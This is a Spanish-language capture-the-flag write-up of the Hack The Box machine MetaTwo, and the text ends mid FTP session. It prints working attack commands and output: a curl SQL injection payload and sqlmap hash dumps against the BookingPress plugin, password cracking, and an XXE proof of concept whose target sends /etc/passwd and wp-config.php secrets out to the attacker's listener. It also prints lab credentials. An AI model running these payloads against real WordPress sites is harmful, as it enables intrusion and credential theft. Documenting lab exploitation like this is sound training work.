---
category: Hack The Box
tags:
  - eWPT
title: Machine MetaTwo
comments: "true"
image: /assets/img/machines/Metatwo/Metatwobanner.jpeg
---
## Introducción
MetaTwo es una máquina Linux de dificultad fácil en Hack The Box que combina vulnerabilidades comunes en entornos web. El punto de entrada se encuentra en un sitio WordPress vulnerable al plugin bookingpress, afectado por una inyección SQL no autenticada, lo que permite obtener hashes de contraseñas de usuarios. Tras crackear las credenciales del usuario manager, se explota una vulnerabilidad XXE en la biblioteca multimedia de WordPress (CVE-2021-29447) para revelar credenciales de acceso FTP. Desde allí, se accede a un archivo que expone las credenciales SSH del usuario jnelson. Finalmente, se logra la escalada de privilegios explotando la utilidad passpie, lo que permite obtener la contraseña del usuario root y comprometer completamente el sistema.

## Skills
- WordPress Enumeration
- BookingPress < 1.0.11 - Unauthenticated SQL Injection [CVE-2022-0739]
- Cracking Hashes
- Authenticated XXE Within the WordPress Media Library - File Inclusion [CVE-2021-29447]

## Enumeración
La enumeración inicial se realizó con un escaneo completo de puertos. Este reveló tres puertos abiertos: el puerto 21 (FTP), el 22 (SSH) y el 80 (HTTP). Esto indica que el sistema ofrece servicios de transferencia de archivos, acceso remoto por consola segura y un servidor web accesible, lo cual sugiere una posible superficie de ataque inicial centrada en aplicaciones web o credenciales expuestas.

```bash
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.186
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Initiating SYN Stealth Scan at 10:31
Scanning 10.10.11.186 [65535 ports]
Discovered open port 22/tcp on 10.10.11.186
Discovered open port 80/tcp on 10.10.11.186
Discovered open port 21/tcp on 10.10.11.186
Completed SYN Stealth Scan at 10:31, 15.87s elapsed (65535 total ports)
Nmap scan report for 10.10.11.186
Host is up, received user-set (0.23s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 63
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 16.06 seconds
           Raw packets sent: 76743 (3.377MB) | Rcvd: 76227 (3.049MB)
```

### Enumeración WEB
Al analizar el puerto 80 con whatweb, se identificó que el servidor web está corriendo nginx 1.18.0 y que redirige automáticamente a http://metapress.htb/. Esto indica que el sitio utiliza un nombre de dominio virtual, por lo que fue necesario agregar la entrada 10.10.11.186 metapress.htb al archivo /etc/hosts para poder acceder correctamente al contenido del sitio web desde el navegador o herramientas de enumeración adicionales.
```bash
❯ whatweb 10.10.11.186
http://10.10.11.186 [302 Found] Country[RESERVED][ZZ], HTTPServer[nginx/1.18.0], IP[10.10.11.186], RedirectLocation[http://metapress.htb/], Title[302 Found], nginx[1.18.0]
ERROR Opening: http://metapress.htb/ - no address for metapress.htb
```

Después de agregar metapress.htb al archivo /etc/hosts, se pudo volver a ejecutar whatweb, se identificó que el servidor corre nginx 1.18.0 y está alojando una instancia de WordPress 5.6.2, desarrollada en PHP 8.0.24. También se observó la presencia de cookies de sesión (PHPSESSID), encabezados poco comunes y un generador HTML que confirma el uso de WordPress. Esta información resultó clave para enfocar la enumeración en posibles vulnerabilidades asociadas a WordPress y sus plugins.
```bash
❯ whatweb 10.10.11.186
http://10.10.11.186 [302 Found] Country[RESERVED][ZZ], HTTPServer[nginx/1.18.0], IP[10.10.11.186], RedirectLocation[http://metapress.htb/], Title[302 Found], nginx[1.18.0]
http://metapress.htb/ [200 OK] Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.18.0], IP[10.10.11.186], MetaGenerator[WordPress 5.6.2], PHP[8.0.24], PoweredBy[--], Script, Title[MetaPress &#8211; Official company site], UncommonHeaders[link], WordPress[5.6.2], X-Powered-By[PHP/8.0.24], nginx[1.18.0]
```
![1](/assets/img/machines/Metatwo/1.jpeg)

### Wordpress Enumeration
Se realizó un escaneo de rutas con wfuzz. La herramienta arrojó varias respuestas interesantes, como  /events.
```bash
❯ wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt --hc 403,404 http://metapress.htb/FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://metapress.htb/FUZZ
Total requests: 207643

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                         
=====================================================================                                                                                       
000000014:   200        155 L    552 W      10342 Ch    "http://metapress.htb/"                                                                         
000000026:   301        0 L      0 W        0 Ch        "about"                                                                                         
000000037:   301        0 L      0 W        0 Ch        "rss"                                                                                           
000000062:   301        0 L      0 W        0 Ch        "events"                                                                                        
000000053:   302        0 L      0 W        0 Ch        "login"                                                                                         
000000124:   301        0 L      0 W        0 Ch        "0"                                                                                             
000000126:   301        0 L      0 W        0 Ch        "feed"                                                                                          
000000187:   301        0 L      0 W        0 Ch        "s"                                                                                             
000000169:   301        0 L      0 W        0 Ch        "atom"                                                                                          
000000198:   301        0 L      0 W        0 Ch        "a"                                                                                             
000000209:   301        0 L      0 W        0 Ch        "c"                                                                                             
000000257:   301        0 L      0 W        0 Ch        "t"                                                                                             
000000256:   302        0 L      0 W        0 Ch        "admin"                                                                                         
000000238:   301        7 L      11 W       169 Ch      "wp-content"                                                                                    
000000386:   301        0 L      0 W        0 Ch        "e"                                                                                             
000000454:   301        0 L      0 W        0 Ch        "h"                              
```

Al acceder a la ruta /events, descubierta durante el fuzzing, se muestra una página activa del sitio con información visible, lo que indica que no requiere autenticación para su acceso.
![2](/assets/img/machines/Metatwo/2.jpeg)

Durante el análisis del código fuente de la ruta /events, se observan múltiples referencias al plugin bookingpress-appointment-booking junto con su número de versión: 1.0.10. Esta información es clave, ya que dicha versión es vulnerable a una inyección SQL no autenticada identificada como CVE-2022-0739.
```HTML
<link rel='stylesheet' id='bookingpress_element_css-css'  href='http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/css/bookingpress_element_theme.css?ver=1.0.10' media='all' />
<link rel='stylesheet' id='bookingpress_fonts_css-css'  href='http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/css/fonts/fonts.css?ver=1.0.10' media='all' />
<link rel='stylesheet' id='bookingpress_front_css-css'  href='http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/css/bookingpress_front.css?ver=1.0.10' media='all' />
<link rel='stylesheet' id='bookingpress_tel_input-css'  href='http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/css/bookingpress_tel_input.css?ver=1.0.10' media='all' />
<link rel='stylesheet' id='bookingpress_calendar_css-css'  href='http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/css/bookingpress_vue_calendar.css?ver=1.0.10' media='all' />
```
![3](/assets/img/machines/Metatwo/3.jpeg)

## CVE-2022-0739
Tras identificar que el plugin vulnerable BookingPress Appointment Booking en su versión 1.0.10 está instalado en el sitio, se confirma mediante documentación pública y exploits disponibles que es afectado por la vulnerabilidad CVE-2022-0739, la cual permite realizar inyecciones SQL sin necesidad de autenticación. Esta vulnerabilidad puede ser explotada para extraer información sensible directamente desde la base de datos del sitio, como hashes de contraseñas de usuarios administradores de WordPress.
![4](/assets/img/machines/Metatwo/4.jpeg)

 se identifican parámetros dinámicos en las solicitudes del sitio, específicamente aquellos que incluyen el parámetro wpnonce. Este parámetro es comúnmente utilizado en WordPress como medida de protección frente a ataques CSRF, pero su presencia también sugiere posibles puntos donde se realiza interacción directa con la base de datos mediante peticiones AJAX. Este tipo de endpoints son frecuentemente vulnerables a inyecciones SQL cuando no se validan adecuadamente los datos de entrada, como es el caso de la vulnerabilidad CVE-2022-0739 en el plugin BookingPress.
![5](/assets/img/machines/Metatwo/5.jpeg)

Para confirmar la vulnerabilidad de inyección SQL en el plugin BookingPress, se realizó una prueba enviando una consulta  a la ruta wp-admin/admin-ajax.php mediante curl. Se inyectó un payload que utilizó un UNION SELECT para obtener información sensible del servidor de base de datos, como la versión de MariaDB y detalles del sistema operativo. La respuesta contenía datos reales extraídos directamente de la base de datos.
```bash
❯ curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=185814d673&category_id= 123&total_service=111) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -'
HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Sun, 29 Jun 2025 17:50:15 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
X-Powered-By: PHP/8.0.24
X-Robots-Tag: noindex
X-Content-Type-Options: nosniff
Expires: Wed, 11 Jan 1984 05:00:00 GMT
Cache-Control: no-cache, must-revalidate, max-age=0
X-Frame-Options: SAMEORIGIN
Referrer-Policy: strict-origin-when-cross-origin

[{"bookingpress_service_id":"10.5.15-MariaDB-0+deb11u1","bookingpress_category_id":"Debian 11","bookingpress_service_name":"debian-linux-gnu","bookingpress_service_price":"$1.00","bookingpress_service_duration_val":"2","bookingpress_service_duration_unit":"3","bookingpress_service_description":"4","bookingpress_service_position":"5","bookingpress_servicedate_created":"6","service_price_without_currency":1,"img_url":"http:\/\/metapress.htb\/wp-content\/plugins\/bookingpress-appointment-booking\/images\/placeholder-img.jpg"}]#               
```

sqlmap logró enumerar las bases de datos disponibles, encontrando dos bases: information_schema y blog. Esta confirmación automatizada permitió avanzar en la extracción de información sensible y en la obtención de credenciales para continuar con la escalada dentro del sistema.
```bash
❯ sqlmap -u "http://metapress.htb/wp-admin/admin-ajax.php" \
--method POST \
--data "action=bookingpress_front_get_category_services&_wpnonce=185814d673&category_id=1&total_service=1" \
-p "total_service" \
--level=5 \
--risk=3 \
--dbms=mysql \
--technique=B \
--batch \
--dbs
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.8.12#stable}
|_ -| . [,]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program


[01:00:10] [INFO] testing connection to the target URL
[01:00:11] [INFO] testing if the target URL content is stable
[01:00:12] [INFO] target URL content is stable
[01:00:12] [WARNING] heuristic (basic) test shows that POST parameter 'total_service' might not be injectable
[01:00:12] [INFO] testing for SQL injection on POST parameter 'total_service'
[01:00:13] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[01:00:14] [INFO] POST parameter 'total_service' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable 
[01:00:14] [INFO] checking if the injection point on POST parameter 'total_service' is a false positive
POST parameter 'total_service' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 30 HTTP(s) requests:
---
Parameter: total_service (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: action=bookingpress_front_get_category_services&_wpnonce=185814d673&category_id=1&total_service=1) AND 6861=6861-- Tmfi
---
[01:00:29] [INFO] testing MySQL
[01:00:30] [INFO] confirming MySQL
[01:00:31] [INFO] the back-end DBMS is MySQL
web application technology: Nginx 1.18.0, PHP 8.0.24
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[01:00:32] [INFO] fetching database names
[01:00:32] [INFO] fetching number of databases
[01:00:32] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[01:00:32] [INFO] retrieved: 2
[01:00:36] [INFO] retrieved: information_schema
[01:01:42] [INFO] retrieved: blog
available databases [2]:
[*] blog
[*] information_schema

[01:01:58] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/metapress.htb'
[01:01:58] [WARNING] your sqlmap version is outdated
```

Luego de identificar la base de datos vulnerable, se procedió a enumerar las tablas dentro de la base de datos blog usando sqlmap con múltiples hilos para acelerar el proceso. Se listaron numerosas tablas relacionadas con WordPress y el plugin BookingPress, incluyendo tablas críticas como wp_users y wp_usermeta, las cuales son clave para la extracción de credenciales y posterior acceso al sistema.
```bash
❯ sqlmap -u "http://metapress.htb/wp-admin/admin-ajax.php" \
--method POST \
--data "action=bookingpress_front_get_category_services&_wpnonce=185814d673&category_id=1&total_service=1" \
-p "total_service" \
-D blog \
--tables \
--batch \
--threads=5

+--------------------------------------+
| wp_bookingpress_appointment_bookings |
| wp_bookingpress_categories           |
| wp_bookingpress_customers            |
| wp_bookingpress_customers_meta       |
| wp_bookingpress_customize_settings   |
| wp_bookingpress_debug_payment_log    |
| wp_bookingpress_default_daysoff      |
| wp_bookingpress_default_workhours    |
| wp_bookingpress_entries              |
| wp_bookingpress_form_fields          |
| wp_bookingpress_notifications        |
| wp_bookingpress_payment_logs         |
| wp_bookingpress_services             |
| wp_bookingpress_servicesmeta         |
| wp_bookingpress_settings             |
| wp_commentmeta                       |
| wp_comments                          |
| wp_links                             |
| wp_options                           |
| wp_postmeta                          |
| wp_posts                             |
| wp_term_relationships                |
| wp_term_taxonomy                     |
| wp_termmeta                          |
| wp_terms                             |
| wp_usermeta                          |
| wp_users                             |
+--------------------------------------+
```

utilizando sqlmap, se extrajeron los hashes de las contraseñas de los usuarios de WordPress desde la tabla wp_users de la base de datos blog. Se obtuvieron dos usuarios con sus respectivos hashes en formato phpass: admin y manager, siendo este último el objetivo para el acceso posterior a la plataforma WordPress.
```bash
❯ sqlmap -u "http://metapress.htb/wp-admin/admin-ajax.php" \
--method POST \
--data "action=bookingpress_front_get_category_services&_wpnonce=185814d673&category_id=1&total_service=1" \
-p "total_service" \
-D blog \
-T wp_users \
--dump \
--batch \
--threads=5
```
![6](/assets/img/machines/Metatwo/6.jpeg)

Los hashes extraídos se guardaron en un archivo llamado users.hash para su posterior análisis y cracking.
```bash
❯ cat users.hash
admin:$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.
manager:$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70
```

Utilizando John the Ripper, se logró crackear el hash correspondiente al usuario manager, obteniendo la contraseña en texto claro: partylikearockstar. 
```bash
❯ john --wordlist=/usr/share/wordlists/rockyou.txt users.hash
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3])
Cost 1 (iteration count) is 8192 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
partylikearockstar (manager)     
```

![7](/assets/img/machines/Metatwo/7.jpeg)

## CVE-2021-29447
Tras identificar que la versión de Wordpress era 5.6.2 mediante whatweb, se buscó una vulnerabilidad compatible y se encontró la CVE-2021-29447, un fallo de tipo XXE en la librería de medios. Para facilitar la explotación, se clonó un repositorio público con un script Proof of Concept (PoC) que automatiza el ataque:
```bash
❯ git clone https://github.com/0xRar/CVE-2021-29447-PoC
Clonando en 'CVE-2021-29447-PoC'...
remote: Enumerating objects: 11, done.
remote: Counting objects: 100% (11/11), done.
remote: Compressing objects: 100% (9/9), done.
remote: Total 11 (delta 1), reused 4 (delta 0), pack-reused 0 (from 0)
Recibiendo objetos: 100% (11/11), listo.
Resolviendo deltas: 100% (1/1), listo.
❯ cd CVE-2021-29447-PoC

```

El script genera una carga maliciosa que debe ser subida manualmente a la biblioteca de medios. Se ejecutó el siguiente comando para iniciar el servidor local que recibirá la respuesta y enviar la carga:
```bash
❯ python3 PoC.py -l 10.10.16.4 -p 4646 -f /etc/passwd

    ╔═╗╦  ╦╔═╗     
    ║  ╚╗╔╝║╣────2021-29447
    ╚═╝ ╚╝ ╚═╝
    Written By (Isa Ebrahim - 0xRar) on January, 2023

    ═══════════════════════════════════════════════════════════════════════════
    [*] Title: Wordpress XML parsing issue in the Media Library leading to XXE
    [*] Affected versions: Wordpress 5.6 - 5.7
    [*] Patched version: Wordpress 5.7.1
    [*] Installation version: PHP 8
    ═══════════════════════════════════════════════════════════════════════════
    
[+] payload.wav was created.
[+] evil.dtd was created.
[+] manually upload the payload.wav file to the Media Library.
[+] wait for the GET request.

[Mon Jun 30 01:49:37 2025] PHP 8.2.28 Development Server (http://0.0.0.0:4646) started
```

Después de generar la carga maliciosa con el script PoC, se subió manualmente el archivo payload.wav a la biblioteca multimedia de Wordpress para activar la vulnerabilidad XXE.
![8](/assets/img/machines/Metatwo/8.jpeg)

Al ejecutarse la carga, el servidor local configurado en la máquina atacante recibió múltiples peticiones del host objetivo, incluyendo solicitudes al archivo evil.dtd, lo que confirmó la explotación exitosa. 
```bash
❯ python3 PoC.py -l 10.10.16.4 -p 4646 -f /etc/passwd

    ╔═╗╦  ╦╔═╗     
    ║  ╚╗╔╝║╣────2021-29447
    ╚═╝ ╚╝ ╚═╝
    Written By (Isa Ebrahim - 0xRar) on January, 2023

    ═══════════════════════════════════════════════════════════════════════════
    [*] Title: Wordpress XML parsing issue in the Media Library leading to XXE
    [*] Affected versions: Wordpress 5.6 - 5.7
    [*] Patched version: Wordpress 5.7.1
    [*] Installation version: PHP 8
    ═══════════════════════════════════════════════════════════════════════════
    
[+] payload.wav was created.
[+] evil.dtd was created.
[+] manually upload the payload.wav file to the Media Library.
[+] wait for the GET request.

[Mon Jun 30 01:49:37 2025] PHP 8.2.28 Development Server (http://0.0.0.0:4646) started
[Mon Jun 30 01:50:56 2025] 10.10.11.186:44086 Accepted
[Mon Jun 30 01:50:56 2025] 10.10.11.186:44086 [200]: GET /evil.dtd
[Mon Jun 30 01:50:56 2025] 10.10.11.186:44086 Closing
[Mon Jun 30 01:50:57 2025] 10.10.11.186:37194 Accepted
[Mon Jun 30 01:50:57 2025] 10.10.11.186:37194 [404]: GET /?p=jVRNj5swEL3nV3BspUSGkGSDj22lXjaVuum9MuAFusamNiShv74zY8gmgu5WHtB8vHkezxisMS2/8BCWRZX5d1pplgpXLnIha6MBEcEaDNY5yxxAXjWmjTJFpRfovfA1LIrPg1zvABTDQo3l8jQL0hmgNny33cYbTiYbSRmai0LUEpm2fBdybxDPjXpHWQssbsejNUeVnYRlmchKycic4FUD8AdYoBDYNcYoppp8lrxSAN/DIpUSvDbBannGuhNYpN6Qe3uS0XUZFhOFKGTc5Hh7ktNYc+kxKUbx1j8mcj6fV7loBY4lRrk6aBuw5mYtspcOq4LxgAwmJXh97iCqcnjh4j3KAdpT6SJ4BGdwEFoU0noCgk2zK4t3Ik5QQIc52E4zr03AhRYttnkToXxFK/jUFasn2Rjb4r7H3rWyDj6IvK70x3HnlPnMmbmZ1OTYUn8n/XtwAkjLC5Qt9VzlP0XT0gDDIe29BEe15Sst27OxL5QLH2G45kMk+OYjQ+NqoFkul74jA+QNWiudUSdJtGt44ivtk4/Y/yCDz8zB1mnniAfuWZi8fzBX5gTfXDtBu6B7iv6lpXL+DxSGoX8NPiqwNLVkI+j1vzUes62gRv8nSZKEnvGcPyAEN0BnpTW6+iPaChneaFlmrMy7uiGuPT0j12cIBV8ghvd3rlG9+63oDFseRRE/9Mfvj8FR2rHPdy3DzGehnMRP+LltfLt2d+0aI9O9wE34hyve2RND7xT7Fw== - No such file or directory
[Mon Jun 30 01:50:57 2025] 10.10.11.186:37194 Closing
[Mon Jun 30 01:50:58 2025] 10.10.11.186:37198 Accepted
[Mon Jun 30 01:50:58 2025] 10.10.11.186:37198 [200]: GET /evil.dtd
[Mon Jun 30 01:50:58 2025] 10.10.11.186:37198 Closing
[Mon Jun 30 01:50:59 2025] 10.10.11.186:37202 Accepted
[Mon Jun 30 01:50:59 2025] 10.10.11.186:37202 [404]: GET /?p=jVRNj5swEL3nV3BspUSGkGSDj22lXjaVuum9MuAFusamNiShv74zY8gmgu5WHtB8vHkezxisMS2/8BCWRZX5d1pplgpXLnIha6MBEcEaDNY5yxxAXjWmjTJFpRfovfA1LIrPg1zvABTDQo3l8jQL0hmgNny33cYbTiYbSRmai0LUEpm2fBdybxDPjXpHWQssbsejNUeVnYRlmchKycic4FUD8AdYoBDYNcYoppp8lrxSAN/DIpUSvDbBannGuhNYpN6Qe3uS0XUZFhOFKGTc5Hh7ktNYc+kxKUbx1j8mcj6fV7loBY4lRrk6aBuw5mYtspcOq4LxgAwmJXh97iCqcnjh4j3KAdpT6SJ4BGdwEFoU0noCgk2zK4t3Ik5QQIc52E4zr03AhRYttnkToXxFK/jUFasn2Rjb4r7H3rWyDj6IvK70x3HnlPnMmbmZ1OTYUn8n/XtwAkjLC5Qt9VzlP0XT0gDDIe29BEe15Sst27OxL5QLH2G45kMk+OYjQ+NqoFkul74jA+QNWiudUSdJtGt44ivtk4/Y/yCDz8zB1mnniAfuWZi8fzBX5gTfXDtBu6B7iv6lpXL+DxSGoX8NPiqwNLVkI+j1vzUes62gRv8nSZKEnvGcPyAEN0BnpTW6+iPaChneaFlmrMy7uiGuPT0j12cIBV8ghvd3rlG9+63oDFseRRE/9Mfvj8FR2rHPdy3DzGehnMRP+LltfLt2d+0aI9O9wE34hyve2RND7xT7Fw== - No such file or directory
[Mon Jun 30 01:50:59 2025] 10.10.11.186:37202 Closing
```

El contenido obtenido mediante la vulnerabilidad XXE incluía una cadena en base64 que representaba el contenido del archivo /etc/passwd. Para decodificarlo, guardé el base64 en un archivo decode.php con un sencillo script que realiza la decodificación y luego ejecuté el script. El resultado fue el listado completo del archivo /etc/passwd del sistema remoto.
```bash
❯ php decode.php
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
sshd:x:104:65534::/run/sshd:/usr/sbin/nologin
jnelson:x:1000:1000:jnelson,,,:/home/jnelson:/bin/bash
systemd-timesync:x:999:999:systemd Time Synchronization:/:/usr/sbin/nologin
systemd-coredump:x:998:998:systemd Core Dumper:/:/usr/sbin/nologin
mysql:x:105:111:MySQL Server,,,:/nonexistent:/bin/false
proftpd:x:106:65534::/run/proftpd:/usr/sbin/nologin
ftp:x:107:65534::/srv/ftp:/usr/sbin/nologin
```

Posteriormente, intenté extraer el archivo de configuración de Wordpress wp-config.php usando la misma vulnerabilidad XXE y el script PoC. 
```bash
❯ python3 PoC.py -l 10.10.16.4 -p 4646 -f ../wp-config.php
[Mon Jun 30 01:58:30 2025] 10.10.11.186:46030 [404]: GET /?p=jVVZU/JKEH2+VvkfhhKMoARUQBARAoRNIEDCpgUhIRMSzEYyYVP87TdBBD71LvAANdNzTs/p6dMPaUMyTk9CgQBgJAg0ToVAFwFy/gsc4njOgkDUTdDVTaFhQssCgdDpiQBFWYMXAMtn2TpRI7ErgPGKPsGAP3l68glXW9HN6gHEtqC5Rf9+vk2Trf9x3uAsa+Ek8eN8g6DpLtXKuxix2ygxyzDCzMwteoX28088SbfQr2mUKJpxIRR9zClu1PHZ/FcWOYkzLYgA0t0LAVkDYxNySNYmh0ydHwVa+A+GXIlo0eSWxEZiXOUjxxSu+gcaXVE45ECtDIiDvK5hCIwlTps4S5JsAVl0qQXd5tEvPFS1SjDbmnwR7LcLNFsjmRK1VUtEBlzu7nmIYBr7kqgQcYZbdFxC/C9xrvRuXKLep1lZzhRWVdaI1m7q88ov0V8KO7T4fyFnCXr/qEK/7NN01dkWOcURa6/hWeby9AQEAGE7z1dD8tgpjK6BtibPbAie4MoCnCYAmlOQhW8jM5asjSG4wWN42F04VpJoMyX2iew7PF8fLO159tpFKkDElhQZXV4ZC9iIyIF1Uh2948/3vYy/2WoWeq+51kq524zMXqeYugXa4+WtmsazoftvN6HJXLtFssdM2NIre/18eMBfj20jGbkb9Ts2F6qUZr5AvE3EJoMwv9DJ7n3imnxOSAOzq3RmvnIzFjPEt9SA832jqFLFIplny/XDVbDKpbrMcY3I+mGCxxpDNFrL80dB2JCk7IvEfRWtNRve1KYFWUba2bl2WerNB+/v5GXhI/c2e+qtvlHUqXqO/FMpjFZh3vR6qfBUTg4Tg8Doo1iHHqOXyc+7fERNkEIqL1zgZnD2NlxfFNL+O3VZb08S8RhqUndU9BvFViGaqDJHFC9JJjsZh65qZ34hKr6UAmgSDcsik36e49HuMjVSMnNvcF4KPHzchwfWRng4ryXxq2V4/dF6vPXk/6UWOybscdQhrJinmIhGhYqV9lKRtTrCm0lOnXaHdsV8Za+DQvmCnrYooftCn3/oqlwaTju59E2wnC7j/1iL/VWwyItID289KV+6VNaNmvE66fP6Kh6cKkN5UFts+kD4qKfOhxWrPKr5CxWmQnbKflA/q1OyUBZTv9biD6Uw3Gqf55qZckuRAJWMcpbSvyzM4s2uBOn6Uoh14Nlm4cnOrqRNJzF9ol+ZojX39SPR60K8muKrRy61bZrDKNj7FeNaHnAaWpSX+K6RvFsfZD8XQQpgC4PF/gAqOHNFgHOo6AY0rfsjYAHy9mTiuqqqC3DXq4qsvQIJIcO6D4XcUfBpILo5CVm2YegmCnGm0/UKDO3PB2UtuA8NfW/xboPNk9l28aeVAIK3dMVG7txBkmv37kQ8SlA24Rjp5urTfh0/vgAe8AksuA82SzcIpuRI53zfTk/+Ojzl3c4VYNl8ucWyAAfYzuI2X+w0RBawjSPCuTN3tu7lGJZiC1AAoryfMiac2U5CrO6a2Y7AhV0YQWdYudPJwp0x76r/Nw== - No such file or directory
```

Después de obtener el archivo wp-config.php mediante la vulnerabilidad XXE, decodifiqué el contenido base64 para revelar la configuración crítica de Wordpress.
```bash
❯ php decode.php
<?php
/** The name of the database for WordPress */
define( 'DB_NAME', 'blog' );

/** MySQL database username */
define( 'DB_USER', 'blog' );

/** MySQL database password */
define( 'DB_PASSWORD', '635Aq@TdqrCwXFUZ' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

define( 'FS_METHOD', 'ftpext' );
define( 'FTP_USER', 'metapress.htb' );
define( 'FTP_PASS', '9NYS_ii@FyL_p5M2NvJ' );
define( 'FTP_HOST', 'ftp.metapress.htb' );
define( 'FTP_BASE', 'blog/' );
define( 'FTP_SSL', false );

/**#@+
 * Authentication Unique Keys and Salts.
 * @since 2.6.0
 */
define( 'AUTH_KEY',         '?!Z$uGO*A6xOE5x,pweP4i*z;m`|.Z:X@)QRQFXkCRyl7}`rXVG=3 n>+3m?.B/:' );
define( 'SECURE_AUTH_KEY',  'x$i$)b0]b1cup;47`YVua/JHq%*8UA6g]0bwoEW:91EZ9h]rWlVq%IQ66pf{=]a%' );
define( 'LOGGED_IN_KEY',    'J+mxCaP4z<g.6P^t`ziv>dd}EEi%48%JnRq^2MjFiitn#&n+HXv]||E+F~C{qKXy' );
define( 'NONCE_KEY',        'SmeDr$$O0ji;^9]*`~GNe!pX@DvWb4m9Ed=Dd(.r-q{^z(F?)7mxNUg986tQO7O5' );
define( 'AUTH_SALT',        '[;TBgc/,M#)d5f[H*tg50ifT?Zv.5Wx=`l@v$-vH*<~:0]s}d<&M;.,x0z~R>3!D' );
define( 'SECURE_AUTH_SALT', '>`VAs6!G955dJs?$O4zm`.Q;amjW^uJrk_1-dI(SjROdW[S&~omiH^jVC?2-I?I.' );
define( 'LOGGED_IN_SALT',   '4[fS^3!=%?HIopMpkgYboy8-jl^i]Mw}Y d~N=&^JsI`M)FJTJEVI) N#NOidIf=' );
define( 'NONCE_SALT',       '.sU&CQ@IRlh O;5aslY+Fq8QWheSNxd6Ve#}w!Bq,h}V9jKSkTGsv%Y451F8L=bL' );

/**
 * WordPress Database Table prefix.
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 * @link https://wordpress.org/support/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', false );

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
	define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';
```

Utilizando las credenciales FTP obtenidas del archivo wp-config.php, me conecté al servidor FTP mediante:
```bash
❯ ftp metapress.htb@metapress.htb
Connected to metapress.htb.
220 ProFTPD Server (Debian) [::ffff:10.10.11.186]
331 Password required for metapress.htb
Password: 
230 User metapress.htb logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||61703|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   5 metapress.htb metapress.htb     4096 Oct  5  2022 blog
drwxr-xr-x   3 metapress.htb metapress.htb     4096 Oct  5  2022 mailer
226 Transfer complete
ftp> 
